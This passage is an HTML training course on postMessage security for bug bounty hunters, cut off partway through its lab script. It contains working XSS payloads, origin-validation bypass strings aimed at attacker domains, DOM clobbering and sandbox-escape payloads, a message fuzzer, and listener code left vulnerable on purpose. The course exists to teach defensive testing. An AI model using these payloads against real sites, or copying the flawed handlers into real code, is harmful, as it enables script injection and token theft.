<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>postMessage Security Testing Course - Bug Bounty Edition</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        
        .header h1 {
            color: #4a5568;
            margin-bottom: 10px;
            font-size: 2.5rem;
        }
        
        .header p {
            color: #718096;
            font-size: 1.2rem;
        }
        
        .nav {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .nav-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }
        
        .nav-btn {
            background: #4299e1;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .nav-btn:hover {
            background: #3182ce;
            transform: translateY(-2px);
        }
        
        .nav-btn.active {
            background: #2d3748;
        }
        
        .content-section {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            display: none;
        }
        
        .content-section.active {
            display: block;
        }
        
        .lab-container {
            background: #f7fafc;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .lab-title {
            background: #4a5568;
            color: white;
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            font-weight: bold;
        }
        
        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            position: relative;
        }
        
        .vulnerable {
            border-left: 5px solid #e53e3e;
        }
        
        .secure {
            border-left: 5px solid #38a169;
        }
        
        .test-area {
            background: #edf2f7;
            border: 2px dashed #cbd5e0;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
            text-align: center;
        }
        
        .iframe-container {
            width: 100%;
            height: 300px;
            border: 2px solid #cbd5e0;
            border-radius: 8px;
            margin: 15px 0;
        }
        
        .test-btn {
            background: #e53e3e;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s ease;
        }
        
        .test-btn:hover {
            background: #c53030;
            transform: scale(1.05);
        }
        
        .safe-btn {
            background: #38a169;
        }
        
        .safe-btn:hover {
            background: #2f855a;
        }
        
        .warning {
            background: #fed7d7;
            border: 1px solid #feb2b2;
            color: #c53030;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        
        .info {
            background: #bee3f8;
            border: 1px solid #90cdf4;
            color: #2b6cb0;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        
        .success {
            background: #c6f6d5;
            border: 1px solid #9ae6b4;
            color: #276749;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        
        .difficulty-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .basic { background: #c6f6d5; color: #276749; }
        .intermediate { background: #feebc8; color: #c05621; }
        .advanced { background: #fed7d7; color: #c53030; }
        .elite { background: #d6bcfa; color: #553c9a; }
        
        .output-area {
            background: #1a202c;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            min-height: 100px;
            font-family: 'Courier New', monospace;
            border: 2px solid #4a5568;
        }
        
        input, textarea {
            width: 100%;
            padding: 10px;
            border: 2px solid #e2e8f0;
            border-radius: 6px;
            margin: 10px 0;
            font-family: inherit;
        }
        
        input:focus, textarea:focus {
            outline: none;
            border-color: #4299e1;
        }
        
        .payload-input {
            font-family: 'Courier New', monospace;
            background: #f7fafc;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîí postMessage Security Testing Course</h1>
            <p>Complete Bug Bounty Guide - From Basic to Elite Level</p>
        </div>
        
        <div class="nav">
            <div class="nav-buttons">
                <button class="nav-btn active" onclick="showSection('intro')">Introduction</button>
                <button class="nav-btn" onclick="showSection('theory')">Theory & Concepts</button>
                <button class="nav-btn" onclick="showSection('basic')">Basic Labs</button>
                <button class="nav-btn" onclick="showSection('intermediate')">Intermediate Labs</button>
                <button class="nav-btn" onclick="showSection('advanced')">Advanced Labs</button>
                <button class="nav-btn" onclick="showSection('elite')">Elite Labs</button>
                <button class="nav-btn" onclick="showSection('methodology')">Testing Methodology</button>
                <button class="nav-btn" onclick="showSection('tools')">Tools & Resources</button>
            </div>
        </div>
        
        <!-- Introduction Section -->
        <div id="intro" class="content-section active">
            <h2>üéØ Course Introduction</h2>
            <p>Welcome to the comprehensive postMessage security testing course designed specifically for bug bounty hunters. This course will take you from zero knowledge to elite-level testing capabilities.</p>
            
            <h3>üìö What You'll Learn</h3>
            <ul style="margin: 20px 0; padding-left: 30px;">
                <li>How postMessage API works internally</li>
                <li>Common vulnerability patterns in real applications</li>
                <li>Step-by-step testing methodologies</li>
                <li>Payload crafting and exploitation techniques</li>
                <li>Advanced bypass methods for modern protections</li>
                <li>Real-world case studies and examples</li>
            </ul>
            
            <h3>üèÜ Course Structure</h3>
            <div class="lab-container">
                <div class="difficulty-badge basic">BASIC</div>
                <p><strong>Foundation Labs:</strong> Understanding postMessage basics, simple origin bypasses</p>
                
                <div class="difficulty-badge intermediate">INTERMEDIATE</div>
                <p><strong>Practical Exploitation:</strong> DOM XSS, data theft, authentication bypass</p>
                
                <div class="difficulty-badge advanced">ADVANCED</div>
                <p><strong>Complex Scenarios:</strong> Multiple origin validation, iframe sandboxing bypasses</p>
                
                <div class="difficulty-badge elite">ELITE</div>
                <p><strong>Cutting-Edge Techniques:</strong> Modern framework bypasses, chained exploits</p>
            </div>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Legal Notice:</strong> This course is for educational purposes only. Always ensure you have proper authorization before testing any application. Only test on your own applications or through legitimate bug bounty programs.
            </div>
        </div>
        
        <!-- Theory Section -->
        <div id="theory" class="content-section">
            <h2>üß† Theory & Core Concepts</h2>
            
            <h3>What is postMessage?</h3>
            <p>The postMessage API enables secure cross-origin communication between different windows, frames, and web workers. It's the backbone of modern web application communication.</p>
            
            <div class="code-block">
// Basic postMessage syntax
targetWindow.postMessage(message, targetOrigin, [transfer]);

// Listening for messages
window.addEventListener('message', function(event) {
    // Handle incoming message
    console.log('Received:', event.data);
    console.log('From origin:', event.origin);
    console.log('Source window:', event.source);
});
            </div>
            
            <h3>üîç Key Security Concepts</h3>
            
            <div class="lab-container">
                <h4>1. Origin Validation</h4>
                <p>The most critical security control in postMessage implementations.</p>
                
                <div class="code-block vulnerable">
// ‚ùå VULNERABLE: No origin validation
window.addEventListener('message', function(event) {
    document.getElementById('content').innerHTML = event.data;
});
                </div>
                
                <div class="code-block secure">
// ‚úÖ SECURE: Proper origin validation
window.addEventListener('message', function(event) {
    if (event.origin !== 'https://trusted-domain.com') {
        return; // Reject untrusted origins
    }
    document.getElementById('content').innerHTML = event.data;
});
                </div>
            </div>
            
            <div class="lab-container">
                <h4>2. Data Validation</h4>
                <p>Always validate and sanitize incoming message data.</p>
                
                <div class="code-block vulnerable">
// ‚ùå VULNERABLE: Direct DOM manipulation
window.addEventListener('message', function(event) {
    if (event.origin === 'https://trusted-domain.com') {
        eval(event.data); // Never do this!
    }
});
                </div>
                
                <div class="code-block secure">
// ‚úÖ SECURE: Safe data handling
window.addEventListener('message', function(event) {
    if (event.origin === 'https://trusted-domain.com') {
        try {
            const data = JSON.parse(event.data);
            if (data.type === 'update' && typeof data.content === 'string') {
                document.getElementById('safe-content').textContent = data.content;
            }
        } catch (e) {
            console.error('Invalid message format');
        }
    }
});
                </div>
            </div>
            
            <h3>üéØ Common Vulnerability Patterns</h3>
            <ul style="margin: 20px 0; padding-left: 30px;">
                <li><strong>Missing Origin Validation:</strong> Accepting messages from any origin</li>
                <li><strong>Weak Origin Validation:</strong> Using indexOf() or endsWith() incorrectly</li>
                <li><strong>Data Injection:</strong> Directly inserting untrusted data into DOM</li>
                <li><strong>Authentication Bypass:</strong> Trusting postMessage for authentication decisions</li>
                <li><strong>JSONP-style Callbacks:</strong> Dynamic function execution based on message data</li>
            </ul>
        </div>
        
        <!-- Basic Labs Section -->
        <div id="basic" class="content-section">
            <h2>üü¢ Basic Level Labs</h2>
            
            <!-- Lab 1 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge basic">BASIC</span>
                    Lab 1: No Origin Validation
                </div>
                
                <p><strong>Objective:</strong> Exploit a postMessage listener that doesn't validate the origin.</p>
                
                <div class="warning">
                    <strong>Scenario:</strong> A web application uses postMessage to update user preferences but doesn't check the message origin.
                </div>
                
                <div class="code-block vulnerable">
// Vulnerable Code (running in target window)
window.addEventListener('message', function(event) {
    document.getElementById('user-pref').innerHTML = event.data;
});
                </div>
                
                <div class="test-area">
                    <h4>üß™ Test Environment</h4>
                    <div id="lab1-target" style="border: 2px solid #e2e8f0; padding: 20px; margin: 10px 0; background: white;">
                        <div id="user-pref">Default user preference</div>
                    </div>
                    
                    <input type="text" id="lab1-payload" class="payload-input" placeholder="Enter your payload here..." value="&lt;img src=x onerror=alert('XSS via postMessage!')&gt;">
                    
                    <button class="test-btn" onclick="exploitLab1()">üöÄ Exploit Lab 1</button>
                    <button class="test-btn safe-btn" onclick="resetLab1()">üîÑ Reset</button>
                </div>
                
                <div class="info">
                    <strong>üí° Learning Points:</strong>
                    <ul>
                        <li>This is the most common postMessage vulnerability</li>
                        <li>Any website can send malicious messages to the target</li>
                        <li>Always validate event.origin before processing messages</li>
                    </ul>
                </div>
                
                <div id="lab1-output" class="output-area"></div>
            </div>
            
            <!-- Lab 2 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge basic">BASIC</span>
                    Lab 2: Weak Origin Validation (indexOf)
                </div>
                
                <p><strong>Objective:</strong> Bypass weak origin validation using indexOf().</p>
                
                <div class="code-block vulnerable">
// Vulnerable Code
window.addEventListener('message', function(event) {
    if (event.origin.indexOf('trusted-site.com') !== -1) {
        document.getElementById('content').innerHTML = event.data;
    }
});
                </div>
                
                <div class="test-area">
                    <h4>üß™ Test Environment</h4>
                    <div id="lab2-target" style="border: 2px solid #e2e8f0; padding: 20px; margin: 10px 0; background: white;">
                        <div id="lab2-content">Protected content area</div>
                    </div>
                    
                    <p>Try different origins to bypass the validation:</p>
                    <input type="text" id="lab2-origin" class="payload-input" placeholder="Enter origin to test..." value="https://evil-trusted-site.com.attacker.com">
                    <input type="text" id="lab2-payload" class="payload-input" placeholder="Enter payload..." value="&lt;h3 style='color:red'&gt;Origin validation bypassed!&lt;/h3&gt;">
                    
                    <button class="test-btn" onclick="exploitLab2()">üöÄ Test Origin Bypass</button>
                    <button class="test-btn safe-btn" onclick="resetLab2()">üîÑ Reset</button>
                </div>
                
                <div class="info">
                    <strong>üí° Learning Points:</strong>
                    <ul>
                        <li>indexOf() can be bypassed by including the trusted domain in a subdomain</li>
                        <li>Never use partial string matching for origin validation</li>
                        <li>Use exact string comparison or URL parsing for proper validation</li>
                    </ul>
                </div>
                
                <div id="lab2-output" class="output-area"></div>
            </div>
            
            <!-- Lab 3 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge basic">BASIC</span>
                    Lab 3: Data Exfiltration via postMessage
                </div>
                
                <p><strong>Objective:</strong> Extract sensitive data from a vulnerable postMessage listener.</p>
                
                <div class="code-block vulnerable">
// Vulnerable Code
window.addEventListener('message', function(event) {
    if (event.data.action === 'getData') {
        event.source.postMessage({
            userData: {
                username: 'john_doe',
                email: 'john@example.com',
                balance: '$5,000'
            }
        }, '*'); // ‚ö†Ô∏è Dangerous wildcard!
    }
});
                </div>
                
                <div class="test-area">
                    <h4>üß™ Test Environment</h4>
                    <p>This lab simulates a page that responds to data requests via postMessage:</p>
                    
                    <button class="test-btn" onclick="exploitLab3()">üöÄ Extract User Data</button>
                    <button class="test-btn safe-btn" onclick="resetLab3()">üîÑ Reset</button>
                    
                    <h4>üì° Intercepted Data:</h4>
                    <div id="lab3-output" class="output-area">No data intercepted yet...</div>
                </div>
                
                <div class="warning">
                    <strong>‚ö†Ô∏è Security Impact:</strong> This vulnerability allows any malicious website to extract sensitive user data by simply requesting it via postMessage.
                </div>
            </div>
        </div>
        
        <!-- Intermediate Labs Section -->
        <div id="intermediate" class="content-section">
            <h2>üü° Intermediate Level Labs</h2>
            
            <!-- Lab 4 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge intermediate">INTERMEDIATE</span>
                    Lab 4: Authentication Token Theft
                </div>
                
                <p><strong>Objective:</strong> Steal authentication tokens from a vulnerable OAuth implementation.</p>
                
                <div class="code-block vulnerable">
// Vulnerable OAuth callback handler
window.addEventListener('message', function(event) {
    if (event.data.type === 'oauth_token') {
        localStorage.setItem('auth_token', event.data.token);
        // Redirect to dashboard
        window.location.href = '/dashboard';
    }
});
                </div>
                
                <div class="test-area">
                    <h4>üß™ OAuth Simulation Environment</h4>
                    <p>Simulate an OAuth flow where tokens are passed via postMessage:</p>
                    
                    <input type="text" id="lab4-token" class="payload-input" placeholder="OAuth token..." value="sk_live_abc123xyz789_secret_token">
                    
                    <button class="test-btn" onclick="simulateOAuth()">üîê Simulate OAuth Flow</button>
                    <button class="test-btn" onclick="exploitOAuth()">üöÄ Intercept Token</button>
                    <button class="test-btn safe-btn" onclick="resetLab4()">üîÑ Reset</button>
                    
                    <h4>üéØ Captured Tokens:</h4>
                    <div id="lab4-output" class="output-area">No tokens captured...</div>
                </div>
                
                <div class="info">
                    <strong>üí° Real-World Impact:</strong> This type of vulnerability is commonly found in OAuth implementations where tokens are passed between windows without proper origin validation.
                </div>
            </div>
            
            <!-- Lab 5 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge intermediate">INTERMEDIATE</span>
                    Lab 5: DOM Clobbering via postMessage
                </div>
                
                <p><strong>Objective:</strong> Use DOM clobbering techniques combined with postMessage to achieve XSS.</p>
                
                <div class="code-block vulnerable">
// Vulnerable code using global variable
window.addEventListener('message', function(event) {
    if (config.trustedOrigin && event.origin === config.trustedOrigin) {
        document.body.innerHTML += event.data;
    }
});
                </div>
                
                <div class="test-area">
                    <h4>üß™ DOM Clobbering Environment</h4>
                    <p>First, we need to clobber the global config object:</p>
                    
                    <textarea id="lab5-clobber" class="payload-input" rows="3" placeholder="DOM clobbering payload...">&lt;form id="config"&gt;&lt;input name="trustedOrigin" value="https://attacker.com"&gt;&lt;/form&gt;</textarea>
                    
                    <button class="test-btn" onclick="setupClobbering()">1Ô∏è‚É£ Setup DOM Clobbering</button>
                    
                    <textarea id="lab5-payload" class="payload-input" rows="3" placeholder="XSS payload...">&lt;img src=x onerror="alert('DOM Clobbering + postMessage XSS!')"&gt;</textarea>
                    
                    <button class="test-btn" onclick="exploitLab5()">2Ô∏è‚É£ Exploit via postMessage</button>
                    <button class="test-btn safe-btn" onclick="resetLab5()">üîÑ Reset</button>
                    
                    <div id="lab5-target" style="border: 2px solid #e2e8f0; padding: 20px; margin: 10px 0; background: white; min-height: 100px;">
                        Target area for DOM clobbering...
                    </div>
                </div>
                
                <div id="lab5-output" class="output-area"></div>
            </div>
        </div>
        
        <!-- Advanced Labs Section -->
        <div id="advanced" class="content-section">
            <h2>üü† Advanced Level Labs</h2>
            
            <!-- Lab 6 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge advanced">ADVANCED</span>
                    Lab 6: Multiple Origin Validation Bypass
                </div>
                
                <p><strong>Objective:</strong> Bypass complex origin validation logic using edge cases.</p>
                
                <div class="code-block vulnerable">
// Complex but flawed validation
window.addEventListener('message', function(event) {
    const allowedOrigins = [
        'https://app.example.com',
        'https://api.example.com',
        'https://cdn.example.com'
    ];
    
    // Vulnerable: Using some() with partial matching
    if (allowedOrigins.some(origin => event.origin.endsWith(origin))) {
        processMessage(event.data);
    }
});
                </div>
                
                <div class="test-area">
                    <h4>üß™ Advanced Bypass Testing</h4>
                    <p>Test various origin bypass techniques:</p>
                    
                    <select id="lab6-technique">
                        <option value="subdomain">Subdomain Technique</option>
                        <option value="tld">TLD Confusion</option>
                        <option value="unicode">Unicode Bypass</option>
                        <option value="null">Null Origin</option>
                    </select>
                    
                    <input type="text" id="lab6-origin" class="payload-input" placeholder="Crafted origin..." readonly>
                    <input type="text" id="lab6-payload" class="payload-input" placeholder="Payload..." value='{"action":"updateProfile","data":"&lt;script&gt;alert(\'Advanced bypass!&');&lt;/script&gt;"}'>
                    
                    <button class="test-btn" onclick="updateOriginTechnique()">üîÑ Update Technique</button>
                    <button class="test-btn" onclick="exploitLab6()">üöÄ Test Bypass</button>
                    <button class="test-btn safe-btn" onclick="resetLab6()">üîÑ Reset</button>
                </div>
                
                <div id="lab6-output" class="output-area"></div>
            </div>
            
            <!-- Lab 7 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge advanced">ADVANCED</span>
                    Lab 7: Iframe Sandbox Escape
                </div>
                
                <p><strong>Objective:</strong> Escape iframe sandbox restrictions using postMessage.</p>
                
                <div class="info">
                    <strong>Scenario:</strong> An application loads untrusted content in a sandboxed iframe but uses postMessage for communication. Find a way to escape the sandbox.
                </div>
                
                <div class="test-area">
                    <h4>üß™ Sandbox Escape Environment</h4>
                    
                    <iframe id="sandboxed-frame" 
                            sandbox="allow-scripts allow-same-origin" 
                            srcdoc="
                                <script>
                                    // Sandboxed iframe trying to communicate
                                    window.parent.postMessage({
                                        type: 'sandboxed_message',
                                        data: 'Hello from sandbox'
                                    }, '*');
                                    
                                    window.addEventListener('message', function(e) {
                                        if (e.data.type === 'execute') {
                                            try {
                                                eval(e.data.code);
                                            } catch (err) {
                                                console.log('Sandbox prevented execution');
                                            }
                                        }
                                    });
                                </script>
                                <p>Sandboxed content loaded</p>
                            " 
                            class="iframe-container">
                    </iframe>
                    
                    <textarea id="lab7-escape" class="payload-input" rows="4" placeholder="Sandbox escape payload...">parent.location = 'javascript:alert("Sandbox escaped via postMessage!")'</textarea>
                    
                    <button class="test-btn" onclick="attemptSandboxEscape()">üöÄ Attempt Escape</button>
                    <button class="test-btn safe-btn" onclick="resetLab7()">üîÑ Reset</button>
                </div>
                
                <div id="lab7-output" class="output-area"></div>
            </div>
        </div>
        
        <!-- Elite Labs Section -->
        <div id="elite" class="content-section">
            <h2>üî¥ Elite Level Labs</h2>
            
            <!-- Lab 8 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge elite">ELITE</span>
                    Lab 8: React/Vue Framework Bypass
                </div>
                
                <p><strong>Objective:</strong> Exploit postMessage vulnerabilities in modern JavaScript frameworks.</p>
                
                <div class="code-block vulnerable">
// Vulnerable React component
function MessageHandler() {
    useEffect(() => {
        const handleMessage = (event) => {
            // Vulnerable: Using dangerouslySetInnerHTML
            if (event.data.type === 'content_update') {
                setContent({
                    __html: event.data.html
                });
            }
        };
        window.addEventListener('message', handleMessage);
        return () => window.removeEventListener('message', handleMessage);
    }, []);
    
    return &lt;div dangerouslySetInnerHTML={content} /&gt;;
}
                </div>
                
                <div class="test-area">
                    <h4>üß™ Framework Exploitation Environment</h4>
                    
                    <select id="lab8-framework">
                        <option value="react">React dangerouslySetInnerHTML</option>
                        <option value="vue">Vue v-html Directive</option>
                        <option value="angular">Angular innerHTML Binding</option>
                    </select>
                    
                    <textarea id="lab8-payload" class="payload-input" rows="4" placeholder="Framework-specific payload...">
&lt;img src=x onerror="
    // React-specific XSS
    alert('Framework XSS via postMessage!');
    // Attempt to access React internals
    console.log(window.React);
"&gt;
                    </textarea>
                    
                    <button class="test-btn" onclick="exploitFramework()">üöÄ Exploit Framework</button>
                    <button class="test-btn safe-btn" onclick="resetLab8()">üîÑ Reset</button>
                    
                    <div id="lab8-target" style="border: 2px solid #e2e8f0; padding: 20px; margin: 10px 0; background: white; min-height: 100px;">
                        Framework component will render here...
                    </div>
                </div>
                
                <div id="lab8-output" class="output-area"></div>
            </div>
            
            <!-- Lab 9 -->
            <div class="lab-container">
                <div class="lab-title">
                    <span class="difficulty-badge elite">ELITE</span>
                    Lab 9: Chained Exploit - CSRF + postMessage
                </div>
                
                <p><strong>Objective:</strong> Chain CSRF and postMessage vulnerabilities for maximum impact.</p>
                
                <div class="warning">
                    <strong>Advanced Scenario:</strong> An application uses postMessage to confirm CSRF-protected actions. Exploit both vulnerabilities in sequence.
                </div>
                
                <div class="test-area">
                    <h4>üß™ Chained Exploitation Environment</h4>
                    
                    <div style="display: flex; gap: 20px; margin: 20px 0;">
                        <div style="flex: 1;">
                            <h5>Step 1: CSRF Setup</h5>
                            <input type="text" id="csrf-token" placeholder="CSRF Token..." value="csrf_abc123">
                            <button class="test-btn" onclick="setupCSRF()">üéØ Setup CSRF</button>
                        </div>
                        
                        <div style="flex: 1;">
                            <h5>Step 2: postMessage Chain</h5>
                            <input type="text" id="chain-payload" placeholder="Chained payload..." value='{"action":"transfer","amount":"$10000","to":"attacker"}'>
                            <button class="test-btn" onclick="executeChain()">‚ö° Execute Chain</button>
                        </div>
                    </div>
                    
                    <button class="test-btn safe-btn" onclick="resetLab9()">üîÑ Reset All</button>
                    
                    <h4>üéØ Exploitation Timeline:</h4>
                    <div id="lab9-output" class="output-area">Ready for chained exploitation...</div>
                </div>
            </div>
        </div>
        
        <!-- Methodology Section -->
        <div id="methodology" class="content-section">
            <h2>üî¨ Testing Methodology</h2>
            
            <h3>üìã Step-by-Step Testing Process</h3>
            
            <div class="lab-container">
                <h4>Phase 1: Discovery</h4>
                <ol style="padding-left: 30px; margin: 15px 0;">
                    <li><strong>Search for postMessage usage:</strong>
                        <div class="code-block">
// Search in DevTools Console
Array.from(document.scripts).map(s => s.innerHTML).join(' ').includes('postMessage')

// Search in Sources tab
Ctrl+Shift+F ‚Üí "postMessage"
Ctrl+Shift+F ‚Üí "addEventListener.*message"
                        </div>
                    </li>
                    <li><strong>Identify message listeners:</strong> Look for event listeners on 'message' events</li>
                    <li><strong>Find message senders:</strong> Look for postMessage() calls</li>
                    <li><strong>Map communication flow:</strong> Understand which windows/frames communicate</li>
                </ol>
            </div>
            
            <div class="lab-container">
                <h4>Phase 2: Analysis</h4>
                <ol style="padding-left: 30px; margin: 15px 0;">
                    <li><strong>Origin validation analysis:</strong>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Is event.origin checked?</li>
                            <li>How is the validation implemented?</li>
                            <li>Are there bypass opportunities?</li>
                        </ul>
                    </li>
                    <li><strong>Data handling analysis:</strong>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>How is event.data processed?</li>
                            <li>Is there input validation/sanitization?</li>
                            <li>Where does the data end up? (DOM, eval, etc.)</li>
                        </ul>
                    </li>
                    <li><strong>Privilege analysis:</strong>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>What actions can be triggered?</li>
                            <li>What sensitive data is accessible?</li>
                            <li>Are there authentication bypasses?</li>
                        </ul>
                    </li>
                </ol>
            </div>
            
            <div class="lab-container">
                <h4>Phase 3: Exploitation</h4>
                <ol style="padding-left: 30px; margin: 15px 0;">
                    <li><strong>Craft test payloads:</strong> Start with simple payloads and gradually increase complexity</li>
                    <li><strong>Test origin bypasses:</strong> Try various techniques to bypass origin validation</li>
                    <li><strong>Test data injection:</strong> Attempt XSS, HTML injection, and other data-based attacks</li>
                    <li><strong>Document impact:</strong> Clearly demonstrate the security impact</li>
                </ol>
            </div>
            
            <h3>üõ†Ô∏è Common Testing Payloads</h3>
            
            <div class="code-block">
// Basic XSS test
&lt;img src=x onerror=alert('XSS')&gt;

// JSON injection test
{"type":"update","content":"&lt;script&gt;alert('JSON XSS')&lt;/script&gt;"}

// Origin bypass tests
https://evil-trusted-domain.com.attacker.com
https://attacker.com/trusted-domain.com
data:text/html,&lt;script&gt;/* payload */&lt;/script&gt;

// Unicode bypass
https://–µxample.com (Cyrillic '–µ' instead of Latin 'e')

// Protocol bypass
javascript:alert('XSS')
vbscript:alert('XSS')
            </div>
            
            <h3>‚ö° Quick Testing Script</h3>
            
            <div class="code-block">
// Paste this in DevTools to test for postMessage vulnerabilities
(function() {
    const originalAddEventListener = window.addEventListener;
    window.addEventListener = function(type, listener, options) {
        if (type === 'message') {
            console.log('üîç Found message listener:', listener.toString());
        }
        return originalAddEventListener.call(this, type, listener, options);
    };
    
    const originalPostMessage = window.postMessage;
    window.postMessage = function(message, targetOrigin, transfer) {
        console.log('üì§ postMessage called:', {message, targetOrigin, transfer});
        return originalPostMessage.call(this, message, targetOrigin, transfer);
    };
    
    console.log('üöÄ postMessage monitoring enabled!');
})();
            </div>
        </div>
        
        <!-- Tools Section -->
        <div id="tools" class="content-section">
            <h2>üõ†Ô∏è Tools & Resources</h2>
            
            <h3>üîß Browser Developer Tools</h3>
            <div class="lab-container">
                <h4>Chrome DevTools</h4>
                <ul style="padding-left: 30px;">
                    <li><strong>Console:</strong> Monitor postMessage calls and test payloads</li>
                    <li><strong>Sources:</strong> Search for postMessage usage across all scripts</li>
                    <li><strong>Network:</strong> Monitor requests triggered by postMessage</li>
                    <li><strong>Security:</strong> Check origin and CSP policies</li>
                </ul>
                
                <div class="code-block">
// Useful Console Commands
window.postMessage('test', '*');
window.addEventListener('message', console.log);
Array.from(document.querySelectorAll('iframe')).map(f => f.src);
                </div>
            </div>
            
            <h3>üöÄ Automated Testing Tools</h3>
            <div class="lab-container">
                <h4>Custom Scripts</h4>
                <div class="code-block">
// postMessage fuzzer
function fuzzPostMessage(targetWindow) {
    const payloads = [
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '{"evil": "&lt;img src=x onerror=alert(1)&gt;"}',
        '"&lt;svg onload=alert(1)&gt;"',
        'javascript:alert("XSS")'
    ];
    
    payloads.forEach(payload => {
        targetWindow.postMessage(payload, '*');
        console.log('Sent payload:', payload);
    });
}

// Usage: fuzzPostMessage(document.querySelector('iframe').contentWindow);
                </div>
            </div>
            
            <h3>üìö Additional Resources</h3>
            <div class="lab-container">
                <ul style="padding-left: 30px;">
                    <li><strong>OWASP Testing Guide:</strong> postMessage security testing methodology</li>
                    <li><strong>PortSwigger Web Security Academy:</strong> DOM-based vulnerabilities</li>
                    <li><strong>MDN Documentation:</strong> Complete postMessage API reference</li>
                    <li><strong>Bug Bounty Reports:</strong> Real-world postMessage vulnerability examples</li>
                </ul>
            </div>
            
            <h3>‚úÖ Testing Checklist</h3>
            <div class="test-area">
                <h4>Pre-Testing Checklist:</h4>
                <label><input type="checkbox"> Identified all postMessage listeners</label><br>
                <label><input type="checkbox"> Mapped communication flows</label><br>
                <label><input type="checkbox"> Analyzed origin validation logic</label><br>
                <label><input type="checkbox"> Understood data processing</label><br>
                <label><input type="checkbox"> Prepared test payloads</label><br>
                <label><input type="checkbox"> Set up testing environment</label><br>
                
                <h4>During Testing:</h4>
                <label><input type="checkbox"> Test for missing origin validation</label><br>
                <label><input type="checkbox"> Test weak validation bypasses</label><br>
                <label><input type="checkbox"> Test data injection attacks</label><br>
                <label><input type="checkbox"> Test privilege escalation</label><br>
                <label><input type="checkbox"> Document all findings</label><br>
                <label><input type="checkbox"> Verify impact and exploitability</label><br>
            </div>
        </div>
    </div>
    
    <script>
        // Global variables for labs
        let interceptedData = [];
        let config = { trustedOrigin: 'https://trusted-site.com' };
        
        // Navigation
        function showSection(sectionId) {
            // Hide all sections
            document.querySelectorAll('.content-section').forEach(section => {
                section.classList.remove('active');
            });
            
            // Remove active class from all nav buttons
            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected section
            document.getElementById(sectionId).classList.add('active');
            
            // Add active class to clicked button
            event.target.classList.add('active');
        }
        
        // Lab 1: No Origin Validation
        function exploitLab1() {
            const payload = document.getElementById('lab1-payload').value;
            const output = document.getElementById('lab1-output');
            
            // Simulate postMessage attack
            const event = {
                origin: 'https://evil-attacker.com',
                data: payload,
                source: window
            };
            
            // Vulnerable handler (no origin validation)
            try {
                document.getElementById('user-pref').innerHTML = payload;
                output.innerHTML = `
‚úÖ EXPLOIT SUCCESSFUL!
Origin: ${event.origin}
Payload: ${payload}
Result: XSS executed - No origin validation present!
                `;
            } catch (e) {
                output.innerHTML = `‚ùå Exploit failed: ${e.message}`;
            }
        }
        
        function resetLab1() {
            document.getElementById('user-pref').innerHTML = 'Default user preference';
            document.getElementById('lab1-output').innerHTML = '';
        }
        
        // Lab 2: Weak Origin Validation
        function exploitLab2() {
            const origin = document.getElementById('lab2-origin').value;
            const payload = document.getElementById('lab2-payload').value;
            const output = document.getElementById('lab2-output');
            
            // Simulate weak validation
            if (origin.indexOf('trusted-site.com') !== -1) {
                document.getElementById('lab2-content').innerHTML = payload;
                output.innerHTML = `
‚úÖ ORIGIN VALIDATION BYPASSED!
Tested Origin: ${origin}
Validation: indexOf('trusted-site.com') !== -1
Result: Validation bypassed because '${origin}' contains 'trusted-site.com'
Payload executed: ${payload}
                `;
            } else {
                output.innerHTML = `
‚ùå Origin validation blocked the attack
